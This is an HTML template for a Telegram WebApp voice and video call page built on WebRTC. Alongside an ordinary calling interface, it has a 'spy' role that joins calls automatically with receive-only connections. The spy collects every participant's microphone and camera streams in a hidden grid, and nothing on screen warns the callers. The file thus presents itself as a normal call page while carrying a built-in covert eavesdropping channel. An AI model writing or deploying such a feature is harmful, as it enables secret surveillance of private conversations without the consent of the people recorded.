<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover"/>
<title>Call</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;user-select:none;-webkit-user-select:none}
:root{--st:env(safe-area-inset-top,0px);--sb:env(safe-area-inset-bottom,0px)}
html,body{height:100%;width:100%;overflow:hidden;position:fixed;background:#000;font-family:'Inter',system-ui,sans-serif;color:#fff;-webkit-font-smoothing:antialiased}

/* ─── Hidden media ─── */
#rv{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;z-index:1;display:block;opacity:0;transition:opacity .4s ease;background:#000}
#rv.active{opacity:1}
#ra{position:fixed;left:-9999px;width:1px;height:1px}

/* ─── Spy grid ─── */
#spy-grid{position:fixed;inset:0;z-index:5;background:#060810;display:none;gap:2px}
#spy-grid.p1{display:flex;flex-direction:column}
#spy-grid.p1 .spy-tile{flex:1}
#spy-grid.p2{display:flex;flex-direction:column}
#spy-grid.p2 .spy-tile{flex:1}
#spy-grid.p3,#spy-grid.p4{display:grid;grid-template-columns:1fr 1fr;grid-template-rows:1fr 1fr;height:100%}
@media(min-width:600px){#spy-grid.p2{flex-direction:row}}
.spy-tile{position:relative;background:#111;overflow:hidden}
.spy-tile video{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
.spy-tile audio{display:none}
.spy-lbl{position:absolute;bottom:8px;left:10px;font-size:10px;font-weight:600;padding:3px 10px;border-radius:100px;background:rgba(0,0,0,.6);backdrop-filter:blur(8px)}
.spy-ph{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:rgba(255,255,255,.3);font-size:32px}

/* ─── SPLASH ─── */
#splash{position:fixed;inset:0;z-index:300;display:flex;flex-direction:column;align-items:center;justify-content:center;background:linear-gradient(180deg,#0f0c24 0%,#0a0f20 100%)}
.sp-avatar{width:96px;height:96px;border-radius:50%;background:linear-gradient(135deg,#3a3060,#1a2850);display:flex;align-items:center;justify-content:center;font-size:38px;margin-bottom:22px;border:2px solid rgba(255,255,255,.1)}
.sp-name{font-size:26px;font-weight:700;letter-spacing:-.02em;margin-bottom:6px}
.sp-sub{font-size:14px;color:rgba(255,255,255,.45);margin-bottom:44px}
.sp-join{width:160px;height:56px;border-radius:100px;border:none;background:#00a884;color:#fff;font-size:16px;font-weight:700;font-family:inherit;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 6px 24px rgba(0,168,132,.35);transition:transform .12s,box-shadow .12s;margin-bottom:18px}
.sp-join:active{transform:scale(.93);box-shadow:0 3px 14px rgba(0,168,132,.25)}
.sp-join svg{width:20px;height:20px;flex-shrink:0}
.sp-browser{font-size:12px;color:rgba(255,255,255,.28);cursor:pointer;padding:8px 20px;background:none;border:none;font-family:inherit}
.sp-browser:active{color:rgba(255,255,255,.55)}

/* ─── AUDIO VIEW ─── */
#audio-bg{position:fixed;inset:0;z-index:2;background:linear-gradient(180deg,#0d0b1e 0%,#07080f 100%);display:flex;flex-direction:column;align-items:center;justify-content:center;padding-bottom:140px}
.wa-avatar{width:112px;height:112px;border-radius:50%;background:linear-gradient(135deg,#3a3060,#1a2850);display:flex;align-items:center;justify-content:center;font-size:44px;border:2px solid rgba(255,255,255,.1);margin-bottom:20px;box-shadow:0 0 0 14px rgba(0,168,132,.06),0 0 0 28px rgba(0,168,132,.03)}
.wa-name{font-size:28px;font-weight:700;letter-spacing:-.025em;margin-bottom:8px}
.wa-status{font-size:15px;color:rgba(255,255,255,.5);letter-spacing:.2px}
.wa-timer{font-size:15px;color:rgba(255,255,255,.55);font-variant-numeric:tabular-nums;margin-top:4px;display:none}

/* ─── VIDEO overlays ─── */
#vid-top{position:fixed;top:0;left:0;right:0;z-index:10;padding:calc(var(--st)+18px) 20px 40px;background:linear-gradient(180deg,rgba(0,0,0,.65) 0%,transparent 100%);display:none;flex-direction:column;align-items:center;gap:4px;transition:opacity .3s}
#vid-top.show{display:flex}
#vid-top.fade{opacity:0;pointer-events:none}
.vt-name{font-size:16px;font-weight:600}
.vt-timer{font-size:13px;color:rgba(255,255,255,.65);font-variant-numeric:tabular-nums}

/* ─── PiP ─── */
#pip{position:fixed;z-index:12;top:calc(var(--st)+20px);right:16px;width:96px;height:140px;border-radius:14px;overflow:hidden;background:#1a1a2a;border:2px solid rgba(255,255,255,.15);box-shadow:0 6px 24px rgba(0,0,0,.6);cursor:grab;display:none}
#pip.show{display:block}
#pip:active{cursor:grabbing}
#lv{width:100%;height:100%;object-fit:cover;display:block;transform:scaleX(-1)}
#cam-off-ph{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:#1a1a2a;font-size:28px;color:rgba(255,255,255,.3)}

/* ─── CONTROLS ─── */
#controls{position:fixed;bottom:0;left:0;right:0;z-index:15;padding:16px 0 calc(var(--sb)+24px);display:none;flex-direction:column;align-items:center;gap:0;background:linear-gradient(0deg,rgba(0,0,0,.7) 0%,transparent 100%)}
#controls.show{display:flex}
.ctrl-row{display:flex;align-items:center;justify-content:center;gap:20px}
.cb{width:58px;height:58px;border-radius:50%;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.12);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);color:#fff;transition:transform .15s,background .15s;flex-shrink:0;position:relative;overflow:hidden}
.cb svg{width:24px;height:24px;fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;pointer-events:none}
.cb:active{transform:scale(.84)}
.cb.off{background:rgba(255,255,255,.92);color:#111}
.cb-end{width:66px;height:66px;background:#e84f4f;color:#fff;box-shadow:0 4px 20px rgba(232,79,79,.45)}
.cb-end:active{background:#c93030;transform:scale(.86)}
.rip{position:absolute;border-radius:50%;background:rgba(255,255,255,.25);pointer-events:none;transform:scale(0);animation:rip .4s ease-out forwards}
@keyframes rip{to{transform:scale(4);opacity:0}}
/* open in browser strip */
#ob-strip{font-size:11px;color:rgba(255,255,255,.3);cursor:pointer;padding:6px 20px;text-align:center;margin-bottom:4px;display:none}
#ob-strip.show{display:block}

/* ─── ENDED ─── */
#ended{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.93);backdrop-filter:blur(28px);display:none;flex-direction:column;align-items:center;justify-content:center;gap:9px}
#ended.show{display:flex;animation:fi .35s ease}
@keyframes fi{from{opacity:0;transform:scale(1.05)}to{opacity:1;transform:scale(1)}}
.end-ico{font-size:62px;animation:shake .4s ease both}
@keyframes shake{0%,100%{transform:rotate(0)}30%{transform:rotate(-9deg)}70%{transform:rotate(7deg)}}
.end-title{font-size:22px;font-weight:700;letter-spacing:-.02em}
.end-dur{font-size:14px;color:rgba(255,255,255,.38)}
</style>
</head>
<body>

<video id="rv" autoplay playsinline webkit-playsinline muted></video>
<audio id="ra" autoplay playsinline webkit-playsinline></audio>
<div id="spy-grid"></div>

<!-- Splash -->
<div id="splash">
  <div class="sp-avatar">👤</div>
  <div class="sp-name" id="sp-name">Partner</div>
  <div class="sp-sub" id="sp-sub">Calling…</div>
  <button class="sp-join" onclick="startSession()">
    <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.61 3.42 2 2 0 0 1 3.6 1.24h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 8.82A16 16 0 0 0 16 17l.94-.94a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
    Join Call
  </button>
  <button class="sp-browser" id="sp-browser" onclick="openInBrowser()">🌐 Open in browser</button>
</div>

<!-- Audio view -->
<div id="audio-bg">
  <div class="wa-avatar" id="wa-av">👤</div>
  <div class="wa-name" id="wa-name">Partner</div>
  <div class="wa-status" id="wa-status">Calling…</div>
  <div class="wa-timer" id="wa-timer">0:00</div>
</div>

<!-- Video top overlay -->
<div id="vid-top">
  <div class="vt-name" id="vt-name">Partner</div>
  <div class="vt-timer" id="vt-timer">0:00</div>
</div>

<!-- Local PiP -->
<div id="pip">
  <video id="lv" autoplay playsinline muted></video>
  <div id="cam-off-ph">📷</div>
</div>

<!-- Controls -->
<div id="controls">
  <div id="ob-strip" onclick="openInBrowser()">🌐 Having issues? Open in browser</div>
  <div class="ctrl-row" id="ctrl-row"></div>
</div>

<!-- Ended -->
<div id="ended">
  <div class="end-ico">📵</div>
  <div class="end-title">Call Ended</div>
  <div class="end-dur" id="end-dur"></div>
</div>

<script>
const ROOM_ID   = "{{ room_id }}";
const ROLE      = "{{ role }}";
const TOKEN     = "{{ token }}";
const CALLER_ID = "{{ caller_id }}";
const CALLEE_ID = "{{ callee_id }}";
const isSpy     = ROLE === 'spy';
const isCaller  = ROLE === 'caller';

// ── Telegram ──────────────────────────────────────────
const TG = window.Telegram?.WebApp;
if (TG) { TG.ready(); TG.expand(); try { TG.setBackgroundColor('#000'); } catch(_){} }
const inTelegram = !!(TG?.initData?.length);

// ── Setup display names ───────────────────────────────
const peerRaw = isCaller ? CALLEE_ID : CALLER_ID;
// If it looks like a pure numeric Telegram ID, show "Partner"
const peerName = /^\d+$/.test(peerRaw) ? 'Partner' : (peerRaw || 'Partner');
document.getElementById('sp-name').textContent  = peerName;
document.getElementById('wa-name').textContent  = peerName;
document.getElementById('vt-name').textContent  = peerName;
document.getElementById('sp-sub').textContent   = isCaller ? 'You are calling' : 'Incoming call';
if (!inTelegram) { document.getElementById('sp-browser').style.display = 'none'; }
else { document.getElementById('ob-strip').classList.add('show'); }

// ── Open in browser ───────────────────────────────────
function openInBrowser() {
  const url = location.href;
  if (TG) { try { TG.openLink(url); return; } catch(_){} }
  if (/Android/i.test(navigator.userAgent)) {
    location.href = `intent:${url}#Intent;scheme=https;package=com.android.chrome;end`;
  } else { window.open(url, '_blank'); }
}

// ── DOM ───────────────────────────────────────────────
const remoteVid = document.getElementById('rv');
const remoteAud = document.getElementById('ra');
const localVid  = document.getElementById('lv');
const camOffPh  = document.getElementById('cam-off-ph');
const audioBg   = document.getElementById('audio-bg');
const vidTop    = document.getElementById('vid-top');
const pipEl     = document.getElementById('pip');
const ctrlEl    = document.getElementById('controls');
const ctrlRow   = document.getElementById('ctrl-row');
const endedEl   = document.getElementById('ended');
const endDurEl  = document.getElementById('end-dur');
const waStatus  = document.getElementById('wa-status');
const waTimer   = document.getElementById('wa-timer');
const vtTimer   = document.getElementById('vt-timer');
const spyGrid   = document.getElementById('spy-grid');
if (isSpy) { pipEl.style.display='none'; }

// ── State ─────────────────────────────────────────────
let localStream = null, ws = null;
let micOn = true, camOn = false;
let facingMode = 'user', isFlipping = false;
const pcMap = {}, candidateQueue = {};
let myId = null, makingOffer = false;
let inVideoMode = false;
// Persistent streams — attached to elements during user gesture so play() always works on mobile
const remoteStream    = new MediaStream();
const remoteAudStream = new MediaStream();

// ── Timer ─────────────────────────────────────────────
let _s = 0, _tv = null;
function startTimer() {
  if (_tv) return; _s = 0;
  _tv = setInterval(() => {
    _s++;
    const t = pad(Math.floor(_s/60)) + ':' + pad(_s%60);
    waTimer.textContent = t; vtTimer.textContent = t;
  }, 1000);
  waTimer.style.display = 'block';
}
function stopTimer() { clearInterval(_tv); _tv = null; }
function pad(n) { return String(n).padStart(2,'0'); }
function durationStr() {
  const m = Math.floor(_s/60), s = _s%60;
  return m ? `${m}m ${s}s` : `${s}s`;
}

// ── ICE / codecs / bitrate ────────────────────────────
let RTC = { iceServers:[{urls:'stun:stun.l.google.com:19302'}], iceCandidatePoolSize:10, bundlePolicy:'max-bundle', sdpSemantics:'unified-plan' };
async function fetchIce() {
  try { const r = await fetch(`/api/ice_servers?token=${TOKEN}`); if (r.ok) RTC = await r.json(); } catch(_){}
}
function fixSdp(sdp, kind) {
  const lines = sdp.split('\r\n');
  const mi = lines.findIndex(l => l.startsWith(`m=${kind}`));
  if (mi===-1) return sdp;
  const order = kind==='video' ? ['VP9','H264','VP8'] : ['opus'];
  const ids = [];
  order.forEach(c => lines.forEach(l => { const m=l.match(/^a=rtpmap:(\d+) ([^/\s]+)/i); if(m&&m[2].toUpperCase()===c&&!ids.includes(m[1])) ids.push(m[1]); }));
  const p = lines[mi].split(' ');
  lines[mi] = [...p.slice(0,3), ...ids, ...p.slice(3).filter(x=>!ids.includes(x))].join(' ');
  return lines.join('\r\n');
}
async function boostBitrate(pc) {
  for (const s of pc.getSenders()) {
    if (!s.track) continue;
    try {
      const p = s.getParameters();
      if (!p.encodings?.length) p.encodings=[{}];
      p.encodings[0].maxBitrate = s.track.kind==='video' ? 2500000 : 128000;
      if (s.track.kind==='video') p.encodings[0].maxFramerate = 30;
      await s.setParameters(p);
    } catch(_){}
  }
}

// ── Video view switch ─────────────────────────────────
// onresize fires when first frame arrives — reliable on desktop Chrome
remoteVid.onresize = () => {
  if (remoteVid.videoWidth > 0 && !inVideoMode) switchToVideo();
};
// Fallback poll — covers iOS WebKit and Telegram WebView where onresize is flaky
let _vgone = 0;
setInterval(() => {
  if (!inVideoMode && remoteVid.videoWidth > 0) { _vgone = 0; switchToVideo(); }
  else if (inVideoMode) {
    if (remoteVid.videoWidth === 0) { if (++_vgone >= 2) switchToAudio(); }
    else _vgone = 0;
  }
}, 1000);

function switchToVideo() {
  inVideoMode = true;
  _vgone = 0;
  audioBg.style.display = 'none';
  remoteVid.classList.add('active');
  remoteVid.play().catch(() => {});
  vidTop.classList.add('show');
  if (!_tv) startTimer();
  schedHide();
  buildControls();
}
function switchToAudio() {
  inVideoMode = false;
  audioBg.style.display = 'flex';
  remoteVid.classList.remove('active');
  // Keep srcObject — ontrack fires once per transceiver lifetime; nulling it means
  // we can never detect video again after partner turns cam off then back on
  vidTop.classList.remove('show');
  buildControls();
}

// ── UI hide/show on tap (video mode only) ─────────────
let hideT;
function schedHide() {
  clearTimeout(hideT);
  vidTop.classList.remove('fade');
  ctrlEl.style.opacity = '1';
  hideT = setTimeout(() => {
    if (inVideoMode) { vidTop.classList.add('fade'); ctrlEl.style.opacity='.3'; }
  }, 4000);
}
document.addEventListener('touchstart', () => { if (inVideoMode) { vidTop.classList.remove('fade'); ctrlEl.style.opacity='1'; schedHide(); }}, {passive:true});

// ── Peer connection ───────────────────────────────────
function drainQ(rid) {
  if (!candidateQueue[rid]) return;
  candidateQueue[rid].forEach(c => pcMap[rid]?.addIceCandidate(new RTCIceCandidate(c)).catch(()=>{}));
  delete candidateQueue[rid];
}

function createPeer(rid, init) {
  if (pcMap[rid]) return pcMap[rid];
  const pc = new RTCPeerConnection(RTC);
  pcMap[rid] = pc;

  if (isSpy) {
    pc.addTransceiver('audio', {direction:'recvonly'});
    pc.addTransceiver('video', {direction:'recvonly'});
  } else if (localStream) {
    // Add audio track
    localStream.getAudioTracks().forEach(t => pc.addTrack(t, localStream));
    // Add sendrecv video transceiver with NO track — allows camera to be added
    // later via replaceTrack without renegotiation
    pc.addTransceiver('video', {direction:'sendrecv'});
  }

  pc.ontrack = e => {
    if (isSpy) {
      const tile = getOrCreateTile(rid);
      const ms = new MediaStream([e.track]);
      if (e.track.kind==='video') { tile.vid.srcObject=ms; tile.vid.play().catch(()=>{}); tile.ph.style.display='none'; }
      else { tile.aud.srcObject=ms; tile.aud.play().catch(()=>{}); }
      return;
    }
    if (e.track.kind === 'video') {
      // Add to persistent stream (already playing from user gesture) — no new play() needed
      remoteStream.getVideoTracks().forEach(t => remoteStream.removeTrack(t));
      remoteStream.addTrack(e.track);
      e.track.onunmute = () => { if (!inVideoMode) switchToVideo(); };
      e.track.onmute   = () => { if (inVideoMode) switchToAudio(); };
    } else {
      remoteAudStream.getAudioTracks().forEach(t => remoteAudStream.removeTrack(t));
      remoteAudStream.addTrack(e.track);
    }
  };

  pc.oniceconnectionstatechange = () => {
    const s = pc.iceConnectionState;
    if (s==='connected' || s==='completed') {
      boostBitrate(pc);
      if (!inVideoMode) waStatus.textContent = 'Connected · Audio call';
      if (!_tv) startTimer();
    }
    if ((s==='failed' || s==='disconnected') && init) pc.restartIce();
  };
  pc.onicecandidate = e => { if (e.candidate) wsSend({type:'candidate',to:rid,candidate:e.candidate}); };

  if (init) {
    pc.onnegotiationneeded = async () => {
      try {
        makingOffer = true;
        const o = await pc.createOffer({voiceActivityDetection:false});
        const sdp = fixSdp(fixSdp(o.sdp,'video'),'audio');
        await pc.setLocalDescription({type:o.type, sdp});
        wsSend({type:'offer', to:rid, sdp:pc.localDescription});
      } catch(e){ console.error(e); }
      finally { makingOffer = false; }
    };
  }
  return pc;
}

// ── Controls ──────────────────────────────────────────
function buildControls() {
  ctrlRow.innerHTML = '';
  if (isSpy) {
    ctrlRow.innerHTML = `<span style="font-size:12px;font-weight:700;letter-spacing:.08em;color:rgba(255,59,92,.8);text-transform:uppercase">👁 SPY</span>`;
    return;
  }
  const btns = [];
  if (camOn) btns.push(btn('flip','<path d="M1 4v6h6"/><path d="M23 20v-6h-6"/><path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4-4.64 4.36A9 9 0 0 1 3.51 15"/>','flipCam()'));
  btns.push(btn(micOn?'mic':'mic-off', micOn
    ? '<path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" x2="12" y1="19" y2="22"/>'
    : '<line x1="2" x2="22" y1="2" y2="22"/><path d="M18.89 13.23A7.12 7.12 0 0 0 19 12v-2"/><path d="M5 10v2a7 7 0 0 0 12 5"/><path d="M15 9.34V5a3 3 0 0 0-5.68-1.33"/><path d="M9 9v3a3 3 0 0 0 5.12 2.12"/><line x1="12" x2="12" y1="19" y2="22"/>',
    'toggleMic()', !micOn));
  btns.push(`<button class="cb cb-end" onclick="endCall()" onpointerdown="rpl(this,event)">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
      <path d="M10.68 13.31a16 16 0 0 0 3.41 2.6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7 2 2 0 0 1 1.72 2v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.42 19.42 0 0 1-3.33-2.67m-2.67-3.34a19.79 19.79 0 0 1-3.07-8.63A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91"/>
      <line x1="22" x2="2" y1="2" y2="22"/>
    </svg>
  </button>`);
  btns.push(btn(camOn?'cam':'cam-off', camOn
    ? '<path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/><circle cx="12" cy="13" r="3"/>'
    : '<line x1="2" x2="22" y1="2" y2="22"/><path d="M7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16"/><path d="M9.5 4h5L17 7h3a2 2 0 0 1 2 2v7.5"/><path d="M14.12 14.12A3 3 0 0 1 9.88 9.88"/>',
    'toggleCam()', !camOn));
  ctrlRow.innerHTML = btns.join('');
}
function btn(id, svgPaths, onclick, isOff=false) {
  return `<button class="cb${isOff?' off':''}" id="btn-${id}" onclick="${onclick}" onpointerdown="rpl(this,event)">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">${svgPaths}</svg>
  </button>`;
}
function rpl(el, e) {
  const r=el.getBoundingClientRect(), d=Math.max(r.width,r.height), sp=document.createElement('span');
  sp.className='rip'; Object.assign(sp.style,{width:d+'px',height:d+'px',left:(e.clientX-r.left-d/2)+'px',top:(e.clientY-r.top-d/2)+'px'});
  el.append(sp); sp.addEventListener('animationend',()=>sp.remove());
}

// ── Mic toggle ────────────────────────────────────────
function toggleMic() {
  micOn = !micOn;
  localStream?.getAudioTracks().forEach(t => t.enabled = micOn);
  buildControls();
}

// ── Camera toggle (uses replaceTrack — no renegotiation) ─
async function toggleCam() {
  if (!camOn) {
    try {
      const vs = await navigator.mediaDevices.getUserMedia({
        video:{ facingMode, width:{ideal:1280,min:640}, height:{ideal:720,min:480}, frameRate:{ideal:30} }
      });
      const vt = vs.getVideoTracks()[0];
      // Add track to local stream for display
      localStream.addTrack(vt);
      localVid.srcObject = new MediaStream([vt]);
      localVid.style.transform = facingMode==='user' ? 'scaleX(-1)' : '';
      localVid.play().catch(()=>{});
      camOffPh.style.display = 'none';
      pipEl.classList.add('show');
      // Replace null track on existing video transceiver — NO renegotiation needed
      for (const pc of Object.values(pcMap)) {
        const txcvr = pc.getTransceivers().find(t => t.receiver.track?.kind==='video');
        if (txcvr) await txcvr.sender.replaceTrack(vt).catch(()=>{});
      }
      camOn = true;
    } catch(e) { console.error('Camera error:', e); return; }
  } else {
    // Remove video track
    localStream.getVideoTracks().forEach(t => { t.stop(); localStream.removeTrack(t); });
    localVid.srcObject = null;
    camOffPh.style.display = 'flex';
    pipEl.classList.remove('show');
    // Clear video sender track
    for (const pc of Object.values(pcMap)) {
      const txcvr = pc.getTransceivers().find(t => t.receiver.track?.kind==='video');
      if (txcvr) await txcvr.sender.replaceTrack(null).catch(()=>{});
    }
    camOn = false;
  }
  buildControls();
}

// ── Flip camera ───────────────────────────────────────
async function flipCam() {
  if (!camOn || isFlipping) return;
  isFlipping = true;
  facingMode = facingMode==='user' ? 'environment' : 'user';
  try {
    const ns = await navigator.mediaDevices.getUserMedia({
      video:{ facingMode:{exact:facingMode}, width:{ideal:1280}, height:{ideal:720} }
    }).catch(() => navigator.mediaDevices.getUserMedia({ video:{ facingMode } }));
    const nt = ns.getVideoTracks()[0];
    localStream.getVideoTracks().forEach(t=>{ t.stop(); localStream.removeTrack(t); });
    localStream.addTrack(nt);
    localVid.srcObject = new MediaStream([nt]);
    localVid.style.transform = facingMode==='user' ? 'scaleX(-1)' : '';
    for (const pc of Object.values(pcMap)) {
      const s = pc.getSenders().find(s => s.track?.kind==='video');
      if (s) await s.replaceTrack(nt).catch(()=>{});
    }
  } catch(_) { facingMode = facingMode==='user'?'environment':'user'; }
  isFlipping = false;
}

// ── End call ──────────────────────────────────────────
function endCall() {
  const dur = durationStr();
  Object.values(pcMap).forEach(p => p.close());
  localStream?.getTracks().forEach(t => t.stop());
  wsSend({type:'room_ended'});
  if (ws) ws.close();
  stopTimer();
  endedEl.classList.add('show');
  endDurEl.textContent = _s > 0 ? `Duration: ${dur}` : '';
  setTimeout(() => {
    try { if (TG?.initData) TG.close(); } catch(_){}
    window.close();
    setTimeout(() => window.history.back(), 400);
  }, 1800);
}

// ── Draggable PiP ─────────────────────────────────────
(function(){
  const el = pipEl;
  let sx,sy,sl,st,drag=false;
  function start(x,y){
    const r=el.getBoundingClientRect();
    sx=x;sy=y;sl=r.left;st=r.top;
    el.style.left=sl+'px';el.style.top=st+'px';
    el.style.right='auto';el.style.bottom='auto';
    drag=true;
  }
  function move(x,y){
    if(!drag)return;
    el.style.left=Math.max(8,Math.min(sl+x-sx,innerWidth-el.offsetWidth-8))+'px';
    el.style.top=Math.max(8,Math.min(st+y-sy,innerHeight-el.offsetHeight-8))+'px';
  }
  function end(){drag=false;}
  el.addEventListener('mousedown',e=>{start(e.clientX,e.clientY);e.preventDefault();});
  window.addEventListener('mousemove',e=>move(e.clientX,e.clientY));
  window.addEventListener('mouseup',end);
  el.addEventListener('touchstart',e=>{const t=e.touches[0];start(t.clientX,t.clientY);},{passive:true});
  window.addEventListener('touchmove',e=>{if(!drag)return;const t=e.touches[0];move(t.clientX,t.clientY);e.preventDefault();},{passive:false});
  window.addEventListener('touchend',end);
})();

// ── WebSocket ─────────────────────────────────────────
function connectWS() {
  const proto = location.protocol==='https:'?'wss':'ws';
  ws = new WebSocket(`${proto}://${location.host}/ws/${ROOM_ID}?role=${ROLE}&token=${TOKEN}`);
  ws.onopen = () => {};
  ws.onmessage = async e => { let d; try{d=JSON.parse(e.data);}catch{return;} await handle(d); };
  ws.onclose = () => {
    Object.values(pcMap).forEach(p=>{try{p.close();}catch(_){}});
    Object.keys(pcMap).forEach(k=>delete pcMap[k]);
    setTimeout(connectWS, 3000);
  };
  ws.onerror = () => {};
}
function wsSend(d){ if(ws?.readyState===WebSocket.OPEN) ws.send(JSON.stringify(d)); }

// ── Signaling ─────────────────────────────────────────
async function handle(d) {
  switch(d.type) {
    case 'room_state':
      myId = d.peer_id;
      if (isCaller) d.peers.filter(p=>!p.startsWith('spy_')).forEach(p=>createPeer(p,true));
      else if (isSpy) d.peers.forEach(p=>createPeer(p,true));
      break;
    case 'peer_joined':
      if (d.peer_id===myId) break;
      if (isCaller||isSpy) createPeer(d.peer_id,true);
      else createPeer(d.peer_id,false);
      break;
    case 'peer_left':
      if (pcMap[d.peer_id]){pcMap[d.peer_id].close();delete pcMap[d.peer_id];}
      delete candidateQueue[d.peer_id];
      if (isSpy) removeTile(d.peer_id);
      else {
        // Partner left — reset to waiting state
        waStatus.textContent = 'Waiting for partner…';
        waTimer.style.display='none'; stopTimer();
        switchToAudio();
      }
      break;
    case 'offer':
      if (d.to!==myId) break;
      {
        const pc = createPeer(d.from, false);
        try {
          await pc.setRemoteDescription(new RTCSessionDescription(d.sdp));
          drainQ(d.from);
          const a = await pc.createAnswer({voiceActivityDetection:false});
          const sdp = fixSdp(fixSdp(a.sdp,'video'),'audio');
          await pc.setLocalDescription({type:a.type,sdp});
          wsSend({type:'answer',to:d.from,sdp:pc.localDescription});
        } catch(e){console.error(e);}
      }
      break;
    case 'answer':
      if (d.to!==myId) break;
      try { await pcMap[d.from]?.setRemoteDescription(new RTCSessionDescription(d.sdp)); drainQ(d.from); }
      catch(e){console.error(e);}
      break;
    case 'candidate':
      if (d.to!==myId) break;
      try {
        const pc=pcMap[d.from];
        if (pc?.remoteDescription?.type) await pc.addIceCandidate(new RTCIceCandidate(d.candidate));
        else { if(!candidateQueue[d.from]) candidateQueue[d.from]=[]; candidateQueue[d.from].push(d.candidate); }
      } catch(_){}
      break;
    case 'room_ended': endCall(); break;
  }
}

// ── Spy tiles ─────────────────────────────────────────
const spyTiles={};
function updateGrid(){const n=Object.keys(spyTiles).length;spyGrid.className='p'+Math.max(1,Math.min(n,4));}
function getOrCreateTile(rid){
  if(spyTiles[rid])return spyTiles[rid];
  const tile=document.createElement('div');tile.className='spy-tile';
  const vid=document.createElement('video');vid.autoplay=true;vid.playsInline=true;vid.muted=true;
  const aud=document.createElement('audio');aud.autoplay=true;
  const ph=document.createElement('div');ph.className='spy-ph';ph.textContent='👤';
  const lbl=document.createElement('div');lbl.className='spy-lbl';lbl.textContent=rid.slice(0,10)+'…';
  tile.append(vid,aud,ph,lbl);spyGrid.appendChild(tile);
  const t={tile,vid,aud,ph,lbl};spyTiles[rid]=t;updateGrid();return t;
}
function removeTile(rid){if(!spyTiles[rid])return;spyTiles[rid].tile.remove();delete spyTiles[rid];updateGrid();}

// ── Start session ─────────────────────────────────────
async function startSession() {
  document.getElementById('splash').style.display = 'none';
  audioBg.style.display = 'flex';
  ctrlEl.classList.add('show');
  buildControls();
  waStatus.textContent = 'Waiting for partner…';

  // Attach streams inside user gesture — this is the ONLY reliable way to unlock
  // autoplay on iOS/Android; play() must have a srcObject when called on mobile
  remoteVid.srcObject = remoteStream;
  remoteAud.srcObject = remoteAudStream;
  remoteVid.play().catch(() => {});
  remoteAud.play().catch(() => {});

  await fetchIce();

  if (!isSpy) {
    try {
      localStream = await navigator.mediaDevices.getUserMedia({
        audio:{ echoCancellation:true, noiseSuppression:true, autoGainControl:true, sampleRate:{ideal:48000} }
      });
    } catch(e) {
      console.error('Mic denied:', e);
      localStream = new MediaStream();
    }
  }
  connectWS();
}

if (isSpy) startSession();
